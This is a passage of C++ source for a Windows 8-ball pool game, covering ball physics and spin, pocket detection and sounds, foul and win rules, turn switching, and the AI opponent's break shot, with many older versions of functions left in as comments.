                if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { b1.vy += cueSpinX * b1.vx * 0.05f; }
                if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { b1.vx -= cueSpinY * b1.vy * 0.05f; }
                cueSpinX *= 0.7f; cueSpinY *= 0.7f;
            }


            // --- Ball-Ball Collisions ---
            for (size_t j = i + 1; j < balls.size(); ++j) {
                Ball& b2 = balls[j];
                if (b2.isPocketed) continue;

                float dx = b2.x - b1.x; float dy = b2.y - b1.y;
                float distSq = dx * dx + dy * dy;
                float minDist = BALL_RADIUS * 2.0f;

                if (distSq > 1e-6 && distSq < minDist * minDist) {
                    float dist = sqrtf(distSq);
                    float overlap = minDist - dist;
                    float nx = dx / dist; float ny = dy / dist;

                    // Separation (Unchanged)
                    b1.x -= overlap * 0.5f * nx; b1.y -= overlap * 0.5f * ny;
                    b2.x += overlap * 0.5f * nx; b2.y += overlap * 0.5f * ny;

                    float rvx = b1.vx - b2.vx; float rvy = b1.vy - b2.vy;
                    float velAlongNormal = rvx * nx + rvy * ny;

                    if (velAlongNormal > 0) { // Colliding
                        // --- Play Ball Collision Sound ---
                        if (!playedCollideSoundThisFrame) {
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""poolballhit.wav"")).detach();
                            playedCollideSoundThisFrame = true; // Set flag
                        }
                        // --- End Sound ---

                        // --- NEW: Track First Hit and Cue/Object Collision ---
                        if (firstHitBallIdThisShot == -1) { // If first hit hasn't been recorded yet
                            if (b1.id == 0) { // Cue ball hit b2 first
                                firstHitBallIdThisShot = b2.id;
                                cueHitObjectBallThisShot = true;
                            }
                            else if (b2.id == 0) { // Cue ball hit b1 first
                                firstHitBallIdThisShot = b1.id;
                                cueHitObjectBallThisShot = true;
                            }
                            // If neither is cue ball, doesn't count as first hit for foul purposes
                        }
                        else if (b1.id == 0 || b2.id == 0) {
                            // Track subsequent cue ball collisions with object balls
                            cueHitObjectBallThisShot = true;
                        }
                        // --- End First Hit Tracking ---


                        // Impulse (Unchanged)
                        float impulse = velAlongNormal;
                        b1.vx -= impulse * nx; b1.vy -= impulse * ny;
                        b2.vx += impulse * nx; b2.vy += impulse * ny;

                        // Spin Transfer (Unchanged)
                        if (b1.id == 0 || b2.id == 0) {
                            float spinEffectFactor = 0.08f;
                            b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            cueSpinX *= 0.85f; cueSpinY *= 0.85f;
                        }
                    }
                }
            } // End ball-ball loop
        } // End ball loop
    } // End CheckCollisions


    bool CheckPockets() {
        bool anyPocketed = false;
        // FIX: Declare a local flag to ensure the sound only plays ONCE per function call.
        bool ballPocketedThisCheck = false;
        // For each ball not already pocketed:
        for (auto& b : balls) {
            if (b.isPocketed)
                continue;

            // Check against each pocket
            for (int p = 0; p < 6; ++p) {
                float dx = b.x - pocketPositions[p].x;
                float dy = b.y - pocketPositions[p].y;
                if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                    // It's in the pocket—remove it from play
                    // If it's the 8?ball, remember which pocket it went into
                    if (b.id == 8) {
                        lastEightBallPocketIndex = p;   // <-- Must set here!
                    }
                    b.isPocketed = true;
                    b.vx = b.vy = 0.0f;           // kill any movement
                    pocketedThisTurn.push_back(b.id);
                    anyPocketed = true;

                    // --- FIX: Insert your sound logic here ---
                    // The 'if' guard prevents multiple sounds on a multi-ball break.
                    if (!ballPocketedThisCheck) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""pocket.wav"")).detach();
                        ballPocketedThisCheck = true;
                    }
                    // --- End Sound Fix ---

                    break;  // no need to check other pockets for this ball
                }
            }
        }
        return anyPocketed;
    }

    bool AreBallsMoving() {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
                return true;
            }
        }
        return false;
    }

    void RespawnCueBall(bool behindHeadstring) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {
            // Determine the initial target position
            float targetX, targetY;
            if (behindHeadstring) {
                targetX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }
            else {
                targetX = TABLE_LEFT + TABLE_WIDTH / 2.0f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }

            // FOOLPROOF FIX: Check if the target spot is valid. If not, nudge it until it is.
            int attempts = 0;
            while (!IsValidCueBallPosition(targetX, targetY, behindHeadstring) && attempts < 100) {
                // If the spot is occupied, try nudging the ball slightly.
                targetX += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                targetY += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                // Clamp to stay within reasonable bounds
                targetX = std::max(TABLE_LEFT + BALL_RADIUS, std::min(targetX, TABLE_RIGHT - BALL_RADIUS));
                targetY = std::max(TABLE_TOP + BALL_RADIUS, std::min(targetY, TABLE_BOTTOM - BALL_RADIUS));
                attempts++;
            }

            // Set the final, valid position.
            cueBall->x = targetX;
            cueBall->y = targetY;
            cueBall->vx = 0;
            cueBall->vy = 0;
            cueBall->isPocketed = false;

            // Set the correct game state for ball-in-hand.
            if (currentPlayer == 1) {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else {
                currentGameState = BALL_IN_HAND_P2;
                if (isPlayer2AI) {
                    aiTurnPending = true;
                }
            }
        }
    }


    // --- Game Logic ---

    void ApplyShot(float power, float angle, float spinX, float spinY) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {

            // --- Play Cue Strike Sound (Threaded) ---
            if (power > 0.1f) { // Only play if it's an audible shot
                std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
            }
            // --- End Sound ---

            cueBall->vx = cosf(angle) * power;
            cueBall->vy = sinf(angle) * power;

            // Apply English (Spin) - Simplified effect (Unchanged)
            cueBall->vx += sinf(angle) * spinY * 0.5f;
            cueBall->vy -= cosf(angle) * spinY * 0.5f;
            cueBall->vx -= cosf(angle) * spinX * 0.5f;
            cueBall->vy -= sinf(angle) * spinX * 0.5f;

            // Store spin (Unchanged)
            cueSpinX = spinX;
            cueSpinY = spinY;

            // --- Reset Foul Tracking flags for the new shot ---
            // (Also reset in LBUTTONUP, but good to ensure here too)
            firstHitBallIdThisShot = -1;      // No ball hit yet
            cueHitObjectBallThisShot = false; // Cue hasn't hit anything yet
            railHitAfterContact = false;     // No rail hit after contact yet
            // --- End Reset ---

                    // If this was the opening break shot, clear the flag
            if (isOpeningBreakShot) {
                isOpeningBreakShot = false; // Mark opening break as taken
            }
        }
    }


    // ---------------------------------------------------------------------
    //  ProcessShotResults()
    // ---------------------------------------------------------------------
    void ProcessShotResults() {
        bool cueBallPocketed = false;
        bool eightBallPocketed = false;
        bool playerContinuesTurn = false;

        // --- Step 1: Update Ball Counts FIRST (THE CRITICAL FIX) ---
        // We must update the score before any other game logic runs.
        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        int ownBallsPocketedThisTurn = 0;

        for (int id : pocketedThisTurn) {
            Ball* b = GetBallById(id);
            if (!b) continue;

            if (b->id == 0) {
                cueBallPocketed = true;
            }
            else if (b->id == 8) {
                eightBallPocketed = true;
            }
            else {
                // This is a numbered ball. Update the pocketed count for the correct player.
                if (b->type == player1Info.assignedType && player1Info.assignedType != BallType::NONE) {
                    player1Info.ballsPocketedCount++;
                }
                else if (b->type == player2Info.assignedType && player2Info.assignedType != BallType::NONE) {
                    player2Info.ballsPocketedCount++;
                }

                if (b->type == shootingPlayer.assignedType) {
                    ownBallsPocketedThisTurn++;
                }
            }
        }

        if (ownBallsPocketedThisTurn > 0) {
            playerContinuesTurn = true;
        }

        // --- Step 2: Handle Game-Ending 8-Ball Shot ---
        // Now that the score is updated, this check will have the correct information.
        if (eightBallPocketed) {
            CheckGameOverConditions(true, cueBallPocketed);
            if (currentGameState == GAME_OVER) {
                pocketedThisTurn.clear();
                return;
            }
        }

        // --- Step 3: Check for Fouls ---
        bool turnFoul = false;
        if (cueBallPocketed) {
            turnFoul = true;
        }
        else {
            Ball* firstHit = GetBallById(firstHitBallIdThisShot);
            if (!firstHit) { // Rule: Hitting nothing is a foul.
                turnFoul = true;
            }
            else { // Rule: Hitting the wrong ball type is a foul.
                if (player1Info.assignedType != BallType::NONE) { // Colors are assigned.
                    // We check if the player WAS on the 8-ball BEFORE this shot.
                    bool wasOnEightBall = (shootingPlayer.assignedType != BallType::NONE && (shootingPlayer.ballsPocketedCount - ownBallsPocketedThisTurn) >= 7);
                    if (wasOnEightBall) {
                        if (firstHit->id != 8) turnFoul = true;
                    }
                    else {
                        if (firstHit->type != shootingPlayer.assignedType) turnFoul = true;
                    }
                }
            }
        } //reenable below disabled for debugging
        //if (!turnFoul && cueHitObjectBallThisShot && !railHitAfterContact && pocketedThisTurn.empty()) {
            //turnFoul = true;
        //}
        foulCommitted = turnFoul;

        // --- Step 4: Final State Transition ---
        if (foulCommitted) {
            SwitchTurns();
            RespawnCueBall(false);
        }
        else if (player1Info.assignedType == BallType::NONE && !pocketedThisTurn.empty() && !cueBallPocketed) {
            // Assign types on the break.
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->type != BallType::EIGHT_BALL) {
                    AssignPlayerBallTypes(b->type);
                    break;
                }
            }
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else if (playerContinuesTurn) {
            // The player's turn continues. Now the check will work correctly.
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else {
            SwitchTurns();
        }

        pocketedThisTurn.clear();
    }

    /*
    // --- Step 3: Final State Transition ---
    if (foulCommitted) {
        SwitchTurns();
        RespawnCueBall(false);
    }
    else if (playerContinuesTurn) {
        CheckAndTransitionToPocketChoice(currentPlayer);
    }
    else {
        SwitchTurns();
    }

    pocketedThisTurn.clear();
    } */

    //  Assign groups AND optionally give the shooter his first count.
    bool AssignPlayerBallTypes(BallType firstPocketedType, bool creditShooter /*= true*/)
    {
        if (firstPocketedType != SOLID && firstPocketedType != STRIPE)
            return false;                                 // safety

        /* ---------------------------------------------------------
           1.  Decide the groups
        --------------------------------------------------------- */
        if (currentPlayer == 1)
        {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }
        else
        {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }

        /* ---------------------------------------------------------
           2.  Count the very ball that made the assignment
        --------------------------------------------------------- */
        if (creditShooter)
        {
            if (currentPlayer == 1)
                ++player1Info.ballsPocketedCount;
            else
                ++player2Info.ballsPocketedCount;
        }
        return true;
    }

    /*bool AssignPlayerBallTypes(BallType firstPocketedType) {
        if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
            if (currentPlayer == 1) {
                player1Info.assignedType = firstPocketedType;
                player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            else {
                player2Info.assignedType = firstPocketedType;
                player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            return true; // Assignment was successful
        }
        return false; // No assignment made (e.g., 8-ball was pocketed on break)
    }*/
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.


    // --- Called in ProcessShotResults() after pocket detection ---
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        // Only care if the 8?ball really went in:
        if (!eightBallPocketed) return;

        // Who’s shooting now?
        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        // Which pocket did we CALL?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did it ACTUALLY fall into?
        int actual = lastEightBallPocketIndex;

        // Check legality: must have called a pocket ?0, must match actual,
        // must have pocketed all 7 of your balls first, and must not have scratched.
        bool legal = (called >= 0)
            && (called == actual)
            && (shooter.ballsPocketedCount >= 7)
            && (!cueBallPocketed);

        // Build a message that shows both values for debugging/tracing:
        if (legal) {
            gameOverMessage = shooter.name
                + L"" Wins! ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name
                + L"" Wins! (Illegal 8-Ball) ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }



    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return;

        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponentPlayer = (currentPlayer == 1) ? player2Info : player1Info;

        // Handle 8-ball on break: re-spot and continue.
        if (player1Info.assignedType == BallType::NONE) {
            Ball* b = GetBallById(8);
            if (b) { b->isPocketed = false; b->x = RACK_POS_X; b->y = RACK_POS_Y; b->vx = b->vy = 0; }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // --- FOOLPROOF WIN/LOSS LOGIC ---
        bool wasOnEightBall = IsPlayerOnEightBall(currentPlayer);
        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = -1;

        // Find which pocket the 8-ball actually went into.
        for (int id : pocketedThisTurn) {
            if (id == 8) {
                Ball* b = GetBallById(8); // This ball is already marked as pocketed, but we need its last coords.
                if (b) {
                    for (int p_idx = 0; p_idx < 6; ++p_idx) {
                        // Check last known position against pocket centers
                        if (GetDistanceSq(b->x, b->y, pocketPositions[p_idx].x, pocketPositions[p_idx].y) < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                            actualPocket = p_idx;
                            break;
                        }
                    }
                }
                break;
            }
        }

        // Evaluate win/loss based on a clear hierarchy of rules.
        if (!wasOnEightBall) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball Pocketed Early)"";
        }
        else if (cueBallPocketed) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Scratched on 8-Ball)"";
        }
        else if (calledPocket == -1) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Pocket Not Called)"";
        }
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball in Wrong Pocket)"";
        }
        else {
            // WIN! All loss conditions failed, this must be a legal win.
            gameOverMessage = shootingPlayer.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    }*/

    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        // Which pocket did we call?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did the ball really fall into?
        int actual = lastEightBallPocketIndex;

        // Legal victory only if:
        //  1) Shooter had already pocketed 7 of their object balls,
        //  2) They called a pocket,
        //  3) The 8?ball actually fell into that same pocket,
        //  4) They did not scratch on the 8?ball.
        bool legal =
            (shooter.ballsPocketedCount >= 7) &&
            (called >= 0) &&
            (called == actual) &&
            (!cueBallPocketed);

        if (legal) {
            gameOverMessage = shooter.name + L"" Wins! ""
                L""(called: "" + std::to_wstring(called) +
                L"", actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name + L"" Wins! (illegal 8-ball) ""
            // For debugging you can append:
            + L"" (called: "" + std::to_wstring(called)
            + L"", actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    // ????????????????????????????????????????????????????????????????
    //  CheckGameOverConditions()
    //     – Called when the 8-ball has fallen.
    //     – Decides who wins and builds the gameOverMessage.
    // ????????????????????????????????????????????????????????????????
    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;                     // safety

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = lastEightBallPocketIndex;

        bool clearedSeven = (shooter.ballsPocketedCount >= 7);
        bool noScratch = !cueBallPocketed;
        bool callMade = (calledPocket >= 0);

        // helper ? turn “-1” into ""None"" for readability
        auto pocketToStr = [](int idx) -> std::wstring
        {
            return (idx >= 0) ? std::to_wstring(idx) : L""None"";
        };

        if (clearedSeven && noScratch && callMade && actualPocket == calledPocket)
        {
            // legitimate win
            gameOverMessage =
                shooter.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }
        else
        {
            // wrong pocket, scratch, or early 8-ball
            gameOverMessage =
                opponent.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    /* void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return; // Only when 8-ball actually pocketed

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        bool      onEightRoll = IsPlayerOnEightBall(currentPlayer);
        int       calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int       actualPocket = -1;
        Ball* bEight = GetBallById(8);

        // locate which hole the 8-ball went into
        if (bEight) {
            for (int i = 0; i < 6; ++i) {
                if (GetDistanceSq(bEight->x, bEight->y,
                    pocketPositions[i].x, pocketPositions[i].y)
                    < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                    actualPocket = i; break;
                }
            }
        }

        // 1) On break / pre-assignment: re-spot & continue
        if (player1Info.assignedType == BallType::NONE) {
            if (bEight) {
                bEight->isPocketed = false;
                bEight->x = RACK_POS_X; bEight->y = RACK_POS_Y;
                bEight->vx = bEight->vy = 0;
            }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // 2) Loss if pocketed 8 early
        if (!onEightRoll) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" pocketed 8-ball early)"";
        }
        // 3) Loss if scratched
        else if (cueBallPocketed) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" scratched on 8-ball)"";
        }
        // 4) Loss if no pocket call
        else if (calledPocket < 0) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" did not call a pocket)"";
        }
        // 5) Loss if in wrong pocket
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" 8-ball in wrong pocket)"";
        }
        // 6) Otherwise, valid win
        else {
            gameOverMessage = shooter.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    } */


    // Switch the shooter, handle fouls and decide what state we go to next.
    // ────────────────────────────────────────────────────────────────
    //  SwitchTurns – final version (arrow–leak bug fixed)
    // ────────────────────────────────────────────────────────────────
    void SwitchTurns()
    {
        /* --------------------------------------------------------- */
        /* 1.  Hand the table over to the other player               */
        /* --------------------------------------------------------- */
        currentPlayer = (currentPlayer == 1) ? 2 : 1;

        /* --------------------------------------------------------- */
        /* 2.  Generic per–turn resets                               */
        /* --------------------------------------------------------- */
        isAiming = false;
        shotPower = 0.0f;
        currentlyHoveredPocket = -1;

        /* --------------------------------------------------------- */
        /* 3.  Wipe every previous pocket call                       */
        /*    (the new shooter will choose again if needed)          */
        /* --------------------------------------------------------- */
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage.clear();

        /* --------------------------------------------------------- */
        /* 4.  Handle fouls — cue-ball in hand overrides everything  */
        /* --------------------------------------------------------- */
        if (foulCommitted)
        {
            if (currentPlayer == 1)            // human
            {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else                               // P2
            {
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = isPlayer2AI;   // AI will place cue-ball
            }

            foulCommitted = false;
            return;                            // we're done for this frame
        }

        /* --------------------------------------------------------- */
        /* 5.  Normal flow                                           */
        /*    Will put us in  ∘ PLAYER?_TURN                         */
        /*                    ∘ CHOOSING_POCKET_P?                   */
        /*                    ∘ AI_THINKING  (for CPU)               */
        /* --------------------------------------------------------- */
        CheckAndTransitionToPocketChoice(currentPlayer);
    }


    void AIBreakShot() {
        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        // This function is called when it's AI's turn for the opening break and state is PRE_BREAK_PLACEMENT.
        // AI will place the cue ball and then plan the shot.
        if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
            // Place cue ball in the kitchen randomly
            /*float kitchenMinX = TABLE_LEFT + BALL_RADIUS; // [cite: 1071, 1072, 1587]
            float kitchenMaxX = HEADSTRING_X - BALL_RADIUS; // [cite: 1072, 1078, 1588]
            float kitchenMinY = TABLE_TOP + BALL_RADIUS; // [cite: 1071, 1072, 1588]
            float kitchenMaxY = TABLE_BOTTOM - BALL_RADIUS; // [cite: 1072, 1073, 1589]*/

            // --- AI Places Cue Ball for Break ---
    // Decide if placing center or side. For simplicity, let's try placing slightly off-center
    // towards one side for a more angled break, or center for direct apex hit.
    // A common strategy is to hit the second ball of the rack.

            float placementY = RACK_POS_Y; // Align vertically with the rack center
            float placementX;

            // Randomly choose a side or center-ish placement for variation.
            int placementChoice = rand() % 3; // 0: Left-ish, 1: Center-ish, 2: Right-ish in kitchen

            if (placementChoice == 0) { // Left-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) - (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the left within kitchen
            }
            else if (placementChoice == 2) { // Right-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) + (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the right within kitchen
            }
            else { // Center-ish
                placementX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // Roughly center of kitchen
            }
            placementX = std::max(TABLE_LEFT + BALL_RADIUS + 1.0f, std::min(placementX, HEADSTRING_X - BALL_RADIUS - 1.0f)); // Clamp within kitchen X

            bool validPos = false;
            int attempts = 0;
            while (!validPos && attempts < 100) {
                /*cueBall->x = kitchenMinX + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxX - kitchenMinX)); // [cite: 1589]
                cueBall->y = kitchenMinY + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxY - kitchenMinY)); // [cite: 1590]
                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1591]
                    validPos = true; // [cite: 1591]*/
                    // Try the chosen X, but vary Y slightly to find a clear spot
                cueBall->x = placementX;
                cueBall->y = placementY + (static_cast<float>(rand() % 100 - 50) / 100.0f) * BALL_RADIUS * 2.0f; // Vary Y a bit
                cueBall->y = std::max(TABLE_TOP + BALL_RADIUS + 1.0f, std::min(cueBall->y, TABLE_BOTTOM - BALL_RADIUS - 1.0f)); // Clamp Y

                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true /* behind headstring */)) {
                    validPos = true;
                }
                attempts++; // [cite: 1592]
            }
            if (!validPos) {
                // Fallback position
                /*cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // [cite: 1071, 1078, 1593]
                cueBall->y = (TABLE_TOP + TABLE_BOTTOM) * 0.5f; // [cite: 1071, 1073, 1594]
                if (!IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1594]
                    cueBall->x = HEADSTRING_X - BALL_RADIUS * 2; // [cite: 1072, 1078, 1594]
                    cueBall->y = RACK_POS_Y; // [cite: 1080, 1595]
                }
            }
            cueBall->vx = 0; // [cite: 1595]
            cueBall->vy = 0; // [cite: 1596]

            // Plan a break shot: aim at the center of the rack (apex ball)
            float targetX = RACK_POS_X; // [cite: 1079] Aim for the apex ball X-coordinate
            float targetY = RACK_POS_Y; // [cite: 1080] Aim for the apex ball Y-coordinate

            float dx = targetX - cueBall->x; // [cite: 1599]
            float dy = targetY - cueBall->y; // [cite: 1600]
            float shotAngle = atan2f(dy, dx); // [cite: 1600]
            float shotPowerValue = MAX_SHOT_POWER; // [cite: 1076, 1600] Use MAX_SHOT_POWER*/

                cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.75f; // A default safe spot in kitchen
                cueBall->y = RACK_POS_Y;
            }
            cueBall->vx = 0; cueBall->vy = 0;

            // --- AI Plans the Break Shot ---
            float targetX, targetY;
            // If cue ball is near center of kitchen width, aim for apex.
            // Otherwise, aim for the second ball on the side the cue ball is on (for a cut break).
            float kitchenCenterRegion = (HEADSTRING_X - TABLE_LEFT) * 0.3f; // Define a ""center"" region
            if (std::abs(cueBall->x - (TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) / 2.0f)) < kitchenCenterRegion / 2.0f) {
                // Center-ish placement: Aim for the apex ball (ball ID 1 or first ball in rack)
                targetX = RACK_POS_X; // Apex ball X
                targetY = RACK_POS_Y; // Apex ball Y
            }
            else {
                // Side placement: Aim to hit the ""second"" ball of the rack for a wider spread.
                // This is a simplification. A more robust way is to find the actual second ball.
                // For now, aim slightly off the apex towards the side the cue ball is on.
                targetX = RACK_POS_X + BALL_RADIUS * 2.0f * 0.866f; // X of the second row of balls
                targetY = RACK_POS_Y + ((cueBall->y > RACK_POS_Y) ? -BALL_RADIUS : BALL_RADIUS); // Aim at the upper or lower of the two second-row balls
            }

            float dx = targetX - cueBall->x;
            float dy = targetY - cueBall->y;
            float shotAngle = atan2f(dy, dx);
            float shotPowerValue = MAX_SHOT_POWER * (0.9f + (rand() % 11) / 100.0f); // Slightly vary max power

            // Store planned shot details for the AI
            /*aiPlannedShotDetails.angle = shotAngle; // [cite: 1102, 1601]
            aiPlannedShotDetails.power = shotPowerValue; // [cite: 1102, 1601]
            aiPlannedShotDetails.spinX = 0.0f; // [cite: 1102, 1601] No spin for a standard power break
            aiPlannedShotDetails.spinY = 0.0f; // [cite: 1103, 1602]
            aiPlannedShotDetails.isValid = true; // [cite: 1103, 1602]*/

            aiPlannedShotDetails.angle = shotAngle;
            aiPlannedShotDetails.power = shotPowerValue;
            aiPlannedShotDetails.spinX = 0.0f; // No spin for break usually
            aiPlannedShotDetails.spinY = 0.0f;
            aiPlannedShotDetails.isValid = true;

            // Update global cue parameters for immediate visual feedback if DrawAimingAids uses them
            /*::cueAngle = aiPlannedShotDetails.angle;      // [cite: 1109, 1603] Update global cueAngle
            ::shotPower = aiPlannedShotDetails.power;     // [cite: 1109, 1604] Update global shotPower
            ::cueSpinX = aiPlannedShotDetails.spinX;    // [cite: 1109]
            ::cueSpinY = aiPlannedShotDetails.spinY;    // [cite: 1110]*/

            ::cueAngle = aiPlannedShotDetails.angle;
            ::shotPower = aiPlannedShotDetails.power;
            ::cueSpinX = aiPlannedShotDetails.spinX;
            ::cueSpinY = aiPlannedShotDetails.spinY;

            // Set up for AI display via GameUpdate
            /*aiIsDisplayingAim = true;                   // [cite: 1104] Enable AI aiming visualization
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES; // [cite: 1105] Set duration for display

            currentGameState = AI_THINKING; // [cite: 1081] Transition to AI_THINKING state.
                                            // GameUpdate will handle the aiAimDisplayFramesLeft countdown
                                            // and then execute the shot using aiPlannedShotDetails.
                                            // isOpeningBreakShot will be set to false within ApplyShot.

            // No immediate ApplyShot or sound here; GameUpdate's AI execution logic will handle it.*/

            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;
            currentGameState = AI_THINKING; // State changes to AI_THINKING, GameUpdate will handle shot execution after display
            aiTurnPending = false;

            return; // The break shot is now planned and will be executed by GameUpdate
        }

        // 2. If not in PRE_BREAK_PLACEMENT (e.g., if this function were called at other times,
        //    though current game logic only calls it for PRE_BREAK_PLACEMENT)
        //    This part can be extended if AIBreakShot needs to handle other scenarios.
        //    For now, the primary logic is above.
    }

    // --- Helper Functions ---

    Ball* GetBallById(int id) {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id == id) {
                return &balls[i];
            }
        }
        return nullptr;
    }

    Ball* GetCueBall() {
        return GetBallById(0);
    }

    float GetDistance(float x1, float y1, float x2, float y2) {
        return sqrtf(GetDistanceSq(x1, y1, x2, y2));
    }

    float GetDistanceSq(float x1, float y1, float x2, float y2) {
        float dx = x2 - x1;
        float dy = y2 - y1;
        return dx * dx + dy * dy;
    }

    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring) {
        // Basic bounds check (inside cushions)
        float left = TABLE_LEFT + CUSHION_THICKNESS + BALL_RADIUS;
        float right = TABLE_RIGHT - CUSHION_THICKNESS - BALL_RADIUS;
        float top = TABLE_TOP + CUSHION_THICKNESS + BALL_RADIUS;
